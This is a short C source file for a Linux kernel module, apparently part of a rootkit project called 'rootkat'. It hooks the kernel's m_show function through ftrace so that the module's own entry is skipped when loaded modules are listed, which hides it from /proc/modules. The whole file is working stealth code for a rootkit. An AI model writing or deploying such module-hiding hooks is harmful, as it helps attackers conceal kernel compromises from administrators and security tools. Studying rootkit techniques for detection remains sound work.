// SPDX-License-Identifier: MIT
#include <linux/module.h>
#include <linux/seq_file.h>
#include <linux/kernel.h>
#include "ftrace_hook.h"

#define TAG "rootkat/hook_m_show: "

static const char * const m_show_candidates[] = {
	"m_show", NULL,
};

typedef int (*m_show_t)(struct seq_file *m, void *p);

static int rootkat_m_show(struct seq_file *m, void *p);
static struct rootkat_hook hook_m_show = {
	.candidates  = m_show_candidates,
	.replacement = rootkat_m_show,
};

static int rootkat_m_show(struct seq_file *m, void *p)
{
	struct module *mod = list_entry(p, struct module, list);
	m_show_t orig = (m_show_t)hook_m_show.original;

	if (mod && strcmp(mod->name, KBUILD_MODNAME) == 0)
		return 0; /* skip our entry */

	return orig(m, p);
}

int rootkat_hook_m_show_install(void)
{
	return rootkat_hook_install(&hook_m_show);
}

void rootkat_hook_m_show_remove(void)
{
	rootkat_hook_remove(&hook_m_show);
}
